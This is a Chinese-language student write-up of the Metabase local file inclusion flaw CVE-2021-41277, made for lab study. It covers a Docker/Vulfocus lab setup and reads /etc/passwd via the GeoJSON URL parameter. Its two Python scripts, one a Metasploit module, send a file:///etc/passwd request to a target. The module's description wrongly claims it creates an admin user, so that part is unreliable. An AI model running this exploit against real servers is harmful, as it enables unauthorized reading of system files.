---
tags: CVE
---
# cve-2021-41277

## 作者 
黃妤婷: Katherine - 國立成功大學資訊工程學系四年級

## 漏洞名稱
* Metabase 任意文件讀取漏洞

##  漏洞說明/描述(成因)
#### 漏洞簡介:
* Metabase是美國Metabase公司開發的一款免費開源的數據分析工具，可以幫助使用者將數據庫中的數據更好的呈現給更多人
* cve-2021-41277 是在2021年發布的 Metabase 任意檔案讀取漏洞，在受影響的版本中，自定義 GeoJSON map `(admin->settings->maps->custom maps->add a map)`存在 LFI 漏洞，起因於URL在載入之前沒有經過驗證，讓攻擊者利用該漏洞可以讀取任意文件。那這個漏洞的影響範圍是 metabase version < 0.40.5 和 metabase version >= 1.0.0, < 1.40.5。

---
#### 漏洞類型:
* LFI
    > local file inclusion

#### 影響範圍:
* metabase version < 0.40.5
* metabase version >= 1.0.0, < 1.40.5
## 漏洞環境建置

1. 我們在虛擬機上開兩台kali，一個做為漏洞靶機另一個為攻擊主機，而且要確認兩台都在同一個網域下
2. 攻擊主機的部分，我是用metasploit連接數據庫再啟動終端模式，之後可用 `db_status` 確認有連上資料庫
3. 再來是建置漏洞環境的部分，我用docker運行vulfocus，在終端機輸入 `docker ps -a`其實就可以看到他的運行狀態，可以看到Vulfocus服務部署在docker容器的80端口，所以打開瀏覽器輸入`http://靶機ip地址:80` ，然後再輸入帳密admin/admin就好。
4. 執行 docker pull command拉取靶場，然後在vulfocus的頁面導入並啟動靶場之後，他會告訴你可以使用哪個port，之後就可以輸入網址看是否成功到metabase的首頁，然後因為我們前面有說到他的漏洞是因為url在載入前沒有經過驗證導入可以讀取任意檔案，因此我們就在url這邊更改參數，像我要讀取的是linux使用者的登入資訊，就在url這邊輸入/etc/passwd，然後就被我拿到了，可以確認這個漏洞靶機現在是真的存在這個LFI漏洞。這裡就是簡單的漏洞說明
* 拉取靶場
![](https://i.imgur.com/W4pG9IQ.png)
![](https://i.imgur.com/pe0GrlO.png)
* 啟動靶場
![](https://i.imgur.com/MuugDHW.png)

* 首頁
    ![](https://i.imgur.com/ujKc1FQ.png)
* /etc/passwd
![](https://i.imgur.com/mukzNBD.png)

---
## Metasploit testcase
* 先使用 python 寫出一份 script，首先確認這個網頁是不是 metabase，再透過是否能夠拿到 `/etc/passwd` 來確認是否真的有 LFI 的漏洞。
    ```python
    #!/usr/bin/env python3

    import requests
    from urllib3.exceptions import ProtocolError, ConnectionError

    def find_base_url(url):
        base_url = f'http://{url}'
        try:
            result = requests.get(base_url, timeout = 3)
        except ProtocolError:
            base_url = f'https://{url}'
            result = requests.get(base_url, timeout = 3)

        return base_url

    def check_valid_url(url):
        res = requests.get(url, timeout = 3)
        if res and 'metabase' in res.text:
            return True
        else:
            return False

    def get_file(base_url, query):
        res = requests.get(f'{base_url}{query}', timeout = 3)
        if res and res.status_code == 200:
            return True
        else:
            return False

    def run():
        try:
            host = '192.168.104.55'
            port = '3000'
            target_uri = '/'
            query = 'api/geojson?url=file:///etc/passwd'

            base_url = find_base_url(f'{host}:{port}{target_uri}')

            if check_valid_url(base_url):
                print('Target is valid')
            else:
                print('It seems that this is not a website provided by metabase.')
                return

            if get_file(base_url, query):
                print('Successfully get /etc/passwd file')
            else:
                print('Failed to get /etc/passwd file')

        except Exception as e:
            print(e) 

    if __name__ == '__main__':
        run()
    ```
* External module
    ```python
    #!/usr/bin/env python3

    # standard modules
    from metasploit import module

    # extra modules
    dependencies_missing = False
    try:
        import requests
        from urllib3.exceptions import ProtocolError
    except ImportError:
        dependencies_missing = True

    metadata = {
        'name': 'Metabase 0.40.0 - 0.40.4 Local File Inclusion',
        'description': '''
            This module creates an amin user by making use of Metabase 0.40.0 - 0.40.4 local file inclusion.
        ''',
        'authors': [
            'amylin',
        ],
        'date': '2022-03-09',
        'license': 'MSF_LICENSE',
        'references': [
            {'type': 'cve', 'ref': '2021-41277'},
        ],
        'type': 'single_scanner',
        'options': {
            'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': 80},
            'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        }
    }


    def find_base_url(args):
        base_url = f"http://{args['rhost']}:{args['RPORT']}{args['TARGETURI']}"
        try:
            result = requests.get(base_url, timeout=3)
        except ProtocolError:
            base_url = f"https://{args['rhost']}:{args['RPORT']}{args['TARGETURI']}"
            result = requests.get(base_url, timeout=3)
        return base_url


    def check_valid_url(url):
        res = requests.get(url, timeout = 3)
        if res and 'metabase' in res.text:
            return True
        else:
            return False


    def get_file(base_url, query):
        res = requests.get(f'{base_url}{query}', timeout = 3)
        if res and res.status_code == 200:
            return True
        else:
            return False


    def run(args):
        try:
            # dependency check
            if dependencies_missing:
                module.log('Module dependency (requests) is missing, cannot continue', level='error')
                return

            # check
            base_url = find_base_url(args)
            if check_valid_url(base_url):
                module.log('Target is valid', level='good')
            else:
                module.log('It seems that this is not a website provided by metabase.', level='warning')
                return

            query = 'api/geojson?url=file:///etc/passwd'
            if get_file(base_url, query):
                module.log('Successfully get /etc/passwd file', level='good')
            else:
                module.log('Failed to get /etc/passwd file', level='error')

        except Exception as e:
            module.log(str(e), level='error')


    if __name__ == '__main__':
        module.run(metadata, run)

    ```
    
## 在Metasploit中使用testcase, 對靶機掃描/利用成功之截圖
![](https://i.imgur.com/FgFow1c.png)


## 參考資料
https://ithelp.ithome.com.tw/articles/10241555

https://medium.com/hijackarno/lfi-rfi%E6%89%8B%E6%B3%95%E4%BB%8B%E7%B4%B9-b9ba8053685

https://www.gushiciku.cn/pl/arMh/zh-tw

https://blog.51cto.com/libai/4935256

https://nosec.org/home/detail/4909.html
>這裡有用vulfocus復現漏洞

https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
>官方建議